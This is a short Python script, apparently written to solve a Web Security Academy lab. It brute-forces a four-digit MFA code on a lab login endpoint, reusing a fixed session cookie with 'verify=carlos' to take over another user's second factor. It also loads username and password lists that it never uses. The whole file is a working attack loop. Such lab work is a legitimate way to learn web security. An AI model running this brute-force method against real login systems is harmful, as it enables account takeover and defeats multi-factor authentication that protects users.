import requests
from tqdm import tqdm
from time import time
from random import randint
import time

usernames = open("./Basic Web Vulnerabilities/usernames.txt").read().splitlines()
passwords = open("./Basic Web Vulnerabilities/passwords.txt").read().splitlines()

url = "https://0afd005b03d2d09282275b5200360013.web-security-academy.net/login2"

headers = {
    'Cookie': 'verify=carlos; session=uX23jLLaWq4hbuctWWCmRZupQv6sp1JC'
}

for code in tqdm(range(131, 10000)):
    data = {
        'mfa-code': str(code).zfill(4),
    }
    response = requests.post(url, headers=headers, data=data)
    if "Incorrect security code" not in response.text:
        print(f"Found code: {code}")
        break

